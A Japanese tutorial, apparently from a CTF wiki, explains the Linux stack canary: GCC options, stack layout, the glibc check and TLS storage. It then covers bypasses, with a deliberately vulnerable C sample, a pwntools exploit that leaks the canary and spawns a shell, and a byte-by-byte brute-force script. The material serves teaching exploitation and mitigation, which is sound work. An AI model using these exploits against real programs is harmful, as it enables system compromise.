# Canary

## 概要
Canary はカナリア(金丝雀)のことで、イギリスの炭鉱労働者が坑内のガスが有毒かどうかを調べるために持ち込んだカナリアの籠に由来します。労働者は坑に入るたびにカナリアを1羽連れて行きました。坑内のガスが有毒な場合、カナリアは毒に敏感なので鳴くのをやめたり死んだりし、それによって労働者は警告を受けられます。

ご存じのとおり、スタックオーバーフローの一般的な悪用方法は、スタック上にあるローカル変数をあふれさせ、あふれたデータで ebp や eip などを上書きして制御フローを乗っ取るというものです。スタックオーバーフロー保護はバッファオーバーフロー攻撃の緩和策の一つです。関数にバッファオーバーフローの脆弱性がある場合、攻撃者はスタック上のリターンアドレスを上書きして shellcode を実行させることができます。スタック保護を有効にすると、関数の実行開始時にスタックの底に cookie 情報が挿入され、関数が実際にリターンするときにその cookie が正当かどうかが検証されます(スタックフレームを破棄する前に、この値が変更されていないかをテストします)。正当でなければプログラムは停止します(スタックオーバーフローが発生したということです)。攻撃者はリターンアドレスを上書きするときに cookie も一緒に上書きしてしまうことが多く、その結果スタック保護のチェックが失敗して shellcode の実行が阻止され、攻撃の成功が防がれます。Linux ではこの cookie 情報を Canary と呼びます。

stack overflow に起因する攻撃は非常に一般的で古くからあるため、それに対応する Canary という mitigation(緩和技術)も早い時期から glibc に登場し、現在でもシステムセキュリティの第一の防衛線として存在しています。

Canary は実装も設計思想も比較的単純で効率的です。stack overflow の危険度が高い領域の末尾に値を一つ挿入し、関数がリターンするときに Canary の値が変更されていないかを検査することで、stack/buffer overflow が発生したかどうかを判断します。

Canary は Windows の GS 保護と並んで、スタックオーバーフロー攻撃を緩和する有効な手段です。Canary の登場によってスタックオーバーフロー攻撃の難易度は大きく上がりました。しかもシステムリソースをほとんど消費しないため、現在では Linux の保護機構の標準装備になっています。


## Canary の原理
### GCC での Canary の利用
GCC では次のオプションで Canary を設定できます。

```
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector 禁用保护
```

### Canary の実装原理

Canary 保護を有効にした場合の stack の構造はおおよそ次のとおりです。

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address

```
Canary を有効にしてプログラムをコンパイルすると、関数のプロローグ部分で fs レジスタの 0x28 の位置にある値を取り出し、スタック上の %ebp-0x8 の位置に格納します。
この操作がスタックへの Canary 値の挿入にあたります。コードは次のとおりです。
```asm
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

関数がリターンする前に、この値を取り出して fs:0x28 の値と XOR します。XOR の結果が 0 であれば Canary は変更されておらず、関数は正常にリターンします。この操作が、スタックオーバーフローが発生したかどうかの検査にあたります。

```asm
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

Canary が不正に変更されていた場合、プログラムの流れは `__stack_chk_fail` に進みます。`__stack_chk_fail` も glibc 内の関数で、デフォルトでは ELF の遅延バインディング(lazy binding)を経由して呼び出されます。定義は次のとおりです。

```C
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

つまり、`__stack_chk_fail` の GOT の値を書き換えて制御フローを乗っ取ったり、`__stack_chk_fail` を利用して内容を leak したりできます(stack smash を参照)。

さらに、Linux では fs レジスタは実際には現在のスタックの TLS 構造体を指しており、fs:0x28 が指しているのがまさに stack\_guard です。
```C
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```
オーバーフローで TLS に保存されている Canary の値を上書きできるなら、保護機構を回避できます。

実際には、TLS 内の値は関数 security\_init によって初期化されます。

```C
static void
security_init (void)
{
  // _dl_random の値は、この関数に入る時点ですでに kernel によって書き込まれている。
  // glibc は _dl_random の値をそのまま使っており、代入はしていない。
  // この方式をとらない場合、glibc が自分で乱数を生成することもできる。

  // _dl_random の最後の1バイトを 0x0 にする
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  
  // Canary の値を TLS に設定する
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD マクロは TLS の設定に使う
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)

```


## Canary の回避技術

### はじめに
Canary はスタックオーバーフロー問題に対する非常に有効な脆弱性緩和策です。しかし、Canary があればあらゆるスタックオーバーフローの悪用を防げるというわけではありません。ここでは Canary が存在する場合の代表的なスタックオーバーフローの悪用方針を挙げますが、それぞれの手法には特定の環境条件が必要なことに注意してください。

### スタック上の Canary の leak
Canary は、文字列を途中で切れるようにするために、バイト `\x00` で終わるように設計されています。
スタック上の Canary を leak する方針は、Canary の最下位バイトを上書きして、残りの Canary 部分を出力させるというものです。
この方法には適切な出力関数が必要で、1回目のオーバーフローで Canary を leak し、2回目のオーバーフローで実行フローを制御する、という流れが必要になることもあります。

#### 悪用例

脆弱なサンプルのソースコードは次のとおりです。

```C
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

32bit プログラムとして、PIE 保護を無効にしてコンパイルします(NX、ASLR、Canary 保護はデフォルトで有効です)。

```bash
$ gcc -m32 -no-pie ex2.c -o ex2
```

まず Canary の最後の `\x00` バイトを上書きして、4バイトの Canary を出力させます。
その後、オフセットを計算して Canary を該当するオーバーフロー位置に埋め込み、getshell 関数へ Ret します。

```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```
### one-by-one による Canary のブルートフォース

Canary は、プロセスを再起動するたびに値が変わります(GS は再起動しても同じ値です)が、同一プロセス内の異なるスレッドの Canary は同じ値です。さらに、
fork 関数で作られた子プロセスの Canary も同じです。fork 関数は親プロセスのメモリをそのままコピーするためです。この性質を利用して、Canary を1バイトずつブルートフォースで完全に求めることができます。
有名な offset2libc の、linux64bit のすべての保護を回避する記事では、著者はこの方法で Canary をブルートフォースして得ています。
以下がブルートフォースの Python コードです。

```python
print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary
```


### `__stack_chk_fail` 関数の乗っ取り
Canary の検査に失敗した場合の処理は `__stack_chk_fail` 関数に進むことが分かっています。`__stack_chk_fail` は通常の遅延バインディング関数なので、GOT テーブルを書き換えることで乗っ取れます。

ZCTF2017 Login を参照してください。fsb 脆弱性で `__stack_chk_fail` の GOT を書き換え、そのうえで ROP により攻略します。

### TLS に保存された Canary 値の上書き

Canary は TLS に保存されており、関数がリターンする前にこの値と比較されることが分かっています。オーバーフローのサイズが大きい場合、スタック上の Canary と TLS 上の Canary を同時に上書きすることで回避できます。

StarCTF2018 babystack を参照してください。



